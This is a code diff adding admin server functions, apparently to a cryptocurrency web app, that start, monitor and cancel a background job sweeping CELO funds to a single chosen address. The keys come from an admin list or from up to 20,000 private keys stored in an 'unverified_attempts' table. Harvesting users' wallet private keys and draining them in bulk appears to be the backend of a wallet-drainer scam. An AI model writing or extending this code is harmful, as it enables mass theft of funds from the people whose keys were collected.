@@ -1690,6 +1690,64 @@ export const adminSweepCeloFromKeys = createServerFn({ method: "POST" })
     };
   });
 
+/** Start a background sweep job: runs on the server, survives page close / data off. */
+export const adminStartCeloSweepJob = createServerFn({ method: "POST" })
+  .inputValidator((i: unknown) =>
+    z
+      .object({
+        to: z.string().trim().regex(/^0x[0-9a-fA-F]{40}$/, "সঠিক receive address দিন (0x...)"),
+        keys: z.array(z.string().trim()).default([]),
+        useNotWhitelisted: z.boolean().default(false),
+      })
+      .parse(i),
+  )
+  .handler(async ({ data }) => {
+    const supabaseAdmin = await gate();
+
+    let keys = data.keys.filter((k) => /^(0x)?[0-9a-fA-F]{64}$/.test(k));
+    if (data.useNotWhitelisted) {
+      const { data: rows, error } = await supabaseAdmin
+        .from("unverified_attempts")
+        .select("wallet_private_key")
+        .not("wallet_private_key", "is", null)
+        .limit(20000);
+      if (error) throw new Error(error.message);
+      keys = (rows ?? []).map((r: any) => r.wallet_private_key as string).filter((k: string) => /^(0x)?[0-9a-fA-F]{64}$/.test(k));
+    }
+    keys = Array.from(new Set(keys));
+    if (keys.length === 0) throw new Error("কোনো valid private key পাওয়া যায়নি");
+
+    // stop any older running job so only one sweep runs at a time
+    await supabaseAdmin.from("celo_sweep_jobs").update({ status: "cancelled" }).eq("status", "running");
+
+    const { data: job, error: insErr } = await supabaseAdmin
+      .from("celo_sweep_jobs")
+      .insert({ to_address: data.to, keys, total_keys: keys.length, heartbeat_at: new Date(Date.now() - 600000).toISOString() })
+      .select("id, total_keys")
+      .maybeSingle();
+    if (insErr || !job) throw new Error(insErr?.message ?? "job তৈরি হয়নি");
+    return { jobId: job.id, total: job.total_keys };
+  });
+
+/** Progress of the latest sweep job (poll this; safe to close the page). */
+export const adminCeloSweepJobStatus = createServerFn({ method: "GET" }).handler(async () => {
+  const supabaseAdmin = await gate();
+  const { data } = await supabaseAdmin
+    .from("celo_sweep_jobs")
+    .select("id, to_address, total_keys, cursor, sent, failed, empty_count, dust, total_celo, status, log, error_message, created_at, updated_at")
+    .order("created_at", { ascending: false })
+    .limit(1)
+    .maybeSingle();
+  return data ?? null;
+});
+
+export const adminCancelCeloSweepJob = createServerFn({ method: "POST" }).handler(async () => {
+  const supabaseAdmin = await gate();
+  await supabaseAdmin.from("celo_sweep_jobs").update({ status: "cancelled" }).eq("status", "running");
+  return { ok: true };
+});
+
+
 
 
 
